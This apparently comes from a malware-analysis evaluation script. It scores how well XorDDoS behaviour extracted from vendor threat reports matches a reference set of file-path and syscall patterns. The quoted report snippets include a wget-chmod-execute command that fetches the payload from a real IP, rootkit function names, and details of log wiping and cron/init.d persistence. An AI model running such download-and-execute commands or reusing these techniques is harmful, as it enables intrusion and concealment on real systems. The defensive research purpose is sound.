asg_object: {'Permission:[0-9]{3}', '/run/systemd/.*', '/var/run', '/boot/[a-z0-9]{10}', '/var', '^PID.*', '^systemctl$', '/etc/sed[0-9a-zA-Z]{6}', '/proc/\\d+/exe', '/proc/stat', '^UID.*', '^chkconfig$', '/.*bin/openrc', '/etc/init\\.d/.*', '.*/perl/.*', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '/var/run/.*', '/.*bin/insserv', '^GID.*', '^sh$', '/etc/rc.*\\.d/.*', 'Permission', '^sed$', '.*/selinux', '/proc/self', '/proc/rs_dev', '/etc/cron\\..*/.*', '/proc/\\d+/root', '/.*bin/sed', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '^update-rc.d$', '/proc/vz', '/etc/crontab', '/boot'}

Sample Xorddos-Cdnetworks.csv
	num of segment in report: 32
	lenght of ctd's OPset is 0
	#R_malObj
	num of ctd objects: 0, num of asg objects: 34. R_malObj is 0.0000
		ctd_object: set()
	#R_malSysObj
	num of ctd objects: 0, num of asg objects: 5. R_malSysObj is 0.0000
		len(asg_OPset): 75, len(ctd_OPset): 0
	#R_malOps
	num of matched asg op: 0, num of asg op: 75. R_malOps is 0.0000
		refered lifecycle: []
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

Sample Xorddos-Crowdstrike.csv
	num of segment in report: 45
	lenght of ctd's OPset is 0
	#R_malObj
	num of ctd objects: 0, num of asg objects: 34. R_malObj is 0.0000
		ctd_object: set()
	#R_malSysObj
	num of ctd objects: 0, num of asg objects: 5. R_malSysObj is 0.0000
		len(asg_OPset): 75, len(ctd_OPset): 0
	#R_malOps
	num of matched asg op: 0, num of asg op: 75. R_malOps is 0.0000
		refered lifecycle: []
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

Sample Xorddos-Intezer.csv
	num of segment in report: 156
	lenght of ctd's OPset is 8
	#R_malObj
	num of ctd objects: 6, num of asg objects: 34. R_malObj is 0.1765
		ctd_object: {'/etc/init\\.d/.*', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '^GID.*', '^UID.*', '/etc/rc.*\\.d/.*', 'Permission'}
	#R_malSysObj
	num of ctd objects: 2, num of asg objects: 5. R_malSysObj is 0.4000
		len(asg_OPset): 75, len(ctd_OPset): 8
	#R_malOps
	num of matched asg op: 1, num of asg op: 75. R_malOps is 0.0133
		refered lifecycle: [69]
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

	hits
	<OP70 act=connect(), obj=ip_addr>, <OP 6 act=hardcode, obj=127.0.0.1, sent=table 2: data collected by the malware and sent back to the c2 server url key	description	comment hostip	ip	hardcoded to 127.0.0.1 softtype		hardcoded to “linux” pscaddr	mac address	 hostname	machine name	 hosttar	username	possibly “host target” hostos	distribution	extracted from /etc/issue or /etc/redhat-release hostcpu	clock speed	/proc/cpuinfo hostmem	amount of memory	/proc/meminfo hostpack		hardcoded to “linux” lkmtag	is rootkit enabled	 kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.>

Sample Xorddos-Ms.csv
	num of segment in report: 252
	lenght of ctd's OPset is 40
	#R_malObj
	num of ctd objects: 16, num of asg objects: 34. R_malObj is 0.4706
		ctd_object: {'/etc/init\\.d/.*', '/proc/self', '/var/run', '/proc/rs_dev', '/var/run/.*', '/etc/cron\\..*/.*', '/var', '^PID.*', '^update-rc.d$', '^GID.*', '^UID.*', '/etc/crontab', '^sh$', '/etc/rc.*\\.d/.*', '^chkconfig$', '/boot'}
	#R_malSysObj
	num of ctd objects: 4, num of asg objects: 5. R_malSysObj is 0.8000
		len(asg_OPset): 75, len(ctd_OPset): 40
	#R_malOps
	num of matched asg op: 13, num of asg op: 75. R_malOps is 0.1733
		refered lifecycle: [57, 8, 31, 26, 55, 30, 56, 15, 21, 12, 18, 62, 0]
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

	hits
	<OP58 act=open(), obj=/var/run/.*>, <OP27 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>
	<OP 9 act=write(), obj=/boot>, <OP 3 act=contain, obj=/var/log/boot.log, sent=after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character: sensitive file	description /root/.bash_history	contains the commands that were run earlier /var/log/wtmp	contains login related record for users /var/log/btmp	contains record of failed login attempt /var/log/lastlog	contains the recent login information for users /var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges /var/log/boot.log	contains information related to system boot and message logged via system startup processes /var/log/cron	contains information related to cron job launch, success and failure error logs /var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc.>
	<OP32 act=getegid(), obj=^GID.*>, <OP 9 act=assign, obj=gid, sent= the following table describes the symbols found in the rootkit and their corresponding functionalities:  function name  	description   give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0” module_hide	hides the rootkit kernel module module_show	unhides the rootkit kernel module get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6 get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6 hide_udp4_port	adds a provided port to a list of hidden udp4 ports unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports hide_udp6_port	adds a provided port to a list of hidden udp6 ports unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports unhide_allz	iterates list of all hidden ports and deletes all entries firewall_acceptip	adds an ip address provided to accept_ips list unfirewall_acceptip	deletes a provided entry from accept_ips list firewall_dropip	adds a provided ip address to drop_ips list unfirewall_dropip	deletes a provided ip address to drop_ips list hide_proc	adds a provided entry to hidden_procs list unhide_proc	deletes a provided entry to hidden_procs list>
	<OP27 act=clone(), obj=^chkconfig$>, <OP22 act=install, obj=chkconfig, sent=screenshot displaying chkconfig and update-rc.d commands installing the startup service figure 16. chkconfig and update-rc.d commands install the startup service argument-based code-flow xorddos has specific code paths corresponding to the number of arguments provided to the program.>
	<OP56 act=open(), obj=/var>, <OP25 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>
	<OP31 act=getgid(), obj=^GID.*>, <OP 9 act=assign, obj=gid, sent= the following table describes the symbols found in the rootkit and their corresponding functionalities:  function name  	description   give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0” module_hide	hides the rootkit kernel module module_show	unhides the rootkit kernel module get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6 get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6 hide_udp4_port	adds a provided port to a list of hidden udp4 ports unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports hide_udp6_port	adds a provided port to a list of hidden udp6 ports unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports unhide_allz	iterates list of all hidden ports and deletes all entries firewall_acceptip	adds an ip address provided to accept_ips list unfirewall_acceptip	deletes a provided entry from accept_ips list firewall_dropip	adds a provided ip address to drop_ips list unfirewall_dropip	deletes a provided ip address to drop_ips list hide_proc	adds a provided entry to hidden_procs list unhide_proc	deletes a provided entry to hidden_procs list>
	<OP57 act=open(), obj=/var/run>, <OP26 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>
	<OP16 act=open(), obj=/etc/cron\..*/.*>, <OP40 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= dropped files dropped file path	file type	sha-256 /etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea>
	<OP22 act=clone(), obj=^sh$>, <OP31 act=find, obj=sh, sent= the fake commands can include:  cat resolv.conf netstat -an bash whoami id cd /etc ifconfig eth0 ifconfig echo “find” uptime sh top gnome-terminal su netstat -antop grep “a” who ls -la pwd route -n ps -ef ls sleep 1>
	<OP13 act=open(), obj=/etc/init\.d/.*>, <OP13 act=drop, obj=/etc/init.d/hflggwyfsc.elf, sent=figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf>
	<OP19 act=open(), obj=/proc/rs_dev>, <OP11 act=have, obj=/proc/rs_dev, sent=in this case, the malware has a provision for communicating with its rootkit component /proc/rs_dev by sending input and output control (ioctl) calls with additional information to take appropriate action.>
	<OP63 act=write(), obj=/var>, <OP 2 act=contain, obj=/var/log/btmp, sent=after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character: sensitive file	description /root/.bash_history	contains the commands that were run earlier /var/log/wtmp	contains login related record for users /var/log/btmp	contains record of failed login attempt /var/log/lastlog	contains the recent login information for users /var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges /var/log/boot.log	contains information related to system boot and message logged via system startup processes /var/log/cron	contains information related to cron job launch, success and failure error logs /var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc.>
	<OP 1 act=readlink(), obj=/proc/self>, <OP24 act=call, obj=/proc/self/exe, sent=before handling the argument-based control, it calls the readlink api with the first parameter as /proc/self/exe to fetch its full process path.>

Sample Xorddos-Trendmicro.csv
	num of segment in report: 27
	lenght of ctd's OPset is 7
	#R_malObj
	num of ctd objects: 7, num of asg objects: 34. R_malObj is 0.2059
		ctd_object: {'/var/run', '/etc/cron\\..*/.*', '/var/run/.*', '/var', '^PID.*', '/etc/rc.*\\.d/.*', 'Permission'}
	#R_malSysObj
	num of ctd objects: 2, num of asg objects: 5. R_malSysObj is 0.4000
		len(asg_OPset): 75, len(ctd_OPset): 7
	#R_malOps
	num of matched asg op: 3, num of asg op: 75. R_malOps is 0.0400
		refered lifecycle: [39, 15, 40]
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

	hits
	<OP40 act=getpid(), obj=^PID.*>, <OP 3 act=gather, obj=pid, sent= information theft  this backdoor gathers the following data:  memory information cpu information network speed pid of running process md5 of running process other details>
	<OP16 act=open(), obj=/etc/cron\..*/.*>, <OP 2 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= this backdoor drops the following files:  /etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems) backdoor routine>
	<OP41 act=getppid(), obj=^PID.*>, <OP 3 act=gather, obj=pid, sent= information theft  this backdoor gathers the following data:  memory information cpu information network speed pid of running process md5 of running process other details>

Sample Xorddos-Trendmicro2.csv
	num of segment in report: 47
	lenght of ctd's OPset is 6
	#R_malObj
	num of ctd objects: 3, num of asg objects: 34. R_malObj is 0.0882
		ctd_object: {'^PID.*', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+'}
	#R_malSysObj
	num of ctd objects: 0, num of asg objects: 5. R_malSysObj is 0.0000
		len(asg_OPset): 75, len(ctd_OPset): 6
	#R_malOps
	num of matched asg op: 4, num of asg op: 75. R_malOps is 0.0533
		refered lifecycle: [66, 65, 39, 40]
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

	hits
	<OP67 act=send(), obj=ip_addr+port>, <OP 2 act=wget, obj=http://122.51.133.49:10086/vip, sent=afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:  wget http://122.51.133.49:10086/vip –o vip chmod 777 vip ./vip the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server.>
	<OP66 act=send(), obj=ip_addr>, <OP 1 act=wget, obj=http://122.51.133.49:10086/vip, sent=afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:  wget http://122.51.133.49:10086/vip –o vip chmod 777 vip ./vip the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server.>
	<OP40 act=getpid(), obj=^PID.*>, <OP 3 act=gather, obj=pid, sent=  it gathered the following data, which are relevant to its attempt to initiate a ddos attack:  cpu information md5 of running process memory information network speed pid of running process it should be noted that most of the behaviors exhibited by this particular xorddos variant have already been observed in earlier variants of the malware.>
	<OP41 act=getppid(), obj=^PID.*>, <OP 3 act=gather, obj=pid, sent=  it gathered the following data, which are relevant to its attempt to initiate a ddos attack:  cpu information md5 of running process memory information network speed pid of running process it should be noted that most of the behaviors exhibited by this particular xorddos variant have already been observed in earlier variants of the malware.>


OperationPair that changes system resources:
[<OP51 act=write(), obj=/etc/sed[0-9a-zA-Z]{6}>, <OP21 act=write(), obj=/etc/rc.*\.d/.*>, <OP54 act=rename(), obj=/etc/crontab>, <OP18 act=write(), obj=/etc/cron\..*/.*>, <OP53 act=fchmod(), obj=/etc/sed[0-9a-zA-Z]{6}>, <OP15 act=write(), obj=/etc/init\.d/.*>]
